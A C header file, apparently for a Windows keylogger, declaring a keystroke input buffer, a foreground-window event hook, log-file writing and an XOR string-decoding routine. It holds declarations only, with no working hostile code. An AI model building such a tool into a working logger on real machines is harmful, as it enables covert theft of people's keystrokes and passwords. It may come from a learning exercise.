#ifndef WINKEY_H
#define WINKEY_H

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <stdbool.h>
#include <stdlib.h>
#include <wchar.h>

#pragma warning(disable:5045)

/* 
    minimal version facor compilator 
    0x0A00 -> windows 10
*/
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2  0x0A00
#define _WIN32_WINNT_WIN10_RS1  0x0A00
#define _WIN32_WINNT_WIN10_RS2  0x0A01
#define _WIN32_WINNT_WIN10_RS3  0x0A02
#define _WIN32_WINNT_WIN10_RS4  0x0A03
#define _WIN32_WINNT_WIN10_RS5  0x0A04

extern HWND LOG_FD;

#define DBG(fmt, ...)                                      \
do {                                                       \
    char _buf[512];                                       \
    _snprintf_s(                                          \
        _buf,                                             \
        sizeof(_buf),                                     \
        _TRUNCATE,                                        \
        fmt,                                              \
        ##__VA_ARGS__);                                   \
    OutputDebugStringA(_buf);                              \
} while (0)


// unciode
#define DBG_unicode(fmt, ...)                                      \
    do {                                                           \
        wchar_t _wbuf[512];                                        \
        _snwprintf_s(                                              \
            _wbuf,                                                 \
            _countof(_wbuf),                                       \
            _TRUNCATE,                                             \
            L##fmt,                                                \
            ##__VA_ARGS__);                                        \
        OutputDebugStringW(_wbuf);                                  \
    } while (0)

// logs_utils.c
char    *GetMyLocalTime(void);
void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime);
void WriteToFile(char* str);
void _GetForegroundWindow(HWND hwnd);
void CreateLogFile(void);

// logs.c
// void    WriteLogs(WCHAR *userInput);


// input.c
WCHAR    *input_get_buffer(void);
void    input_add_key(WCHAR c);
WCHAR    *input_buffer(void);
void    input_clean_buffer(void);
void    input_add_string(char *str);

unsigned char *XorStrings(char *enc);

#endif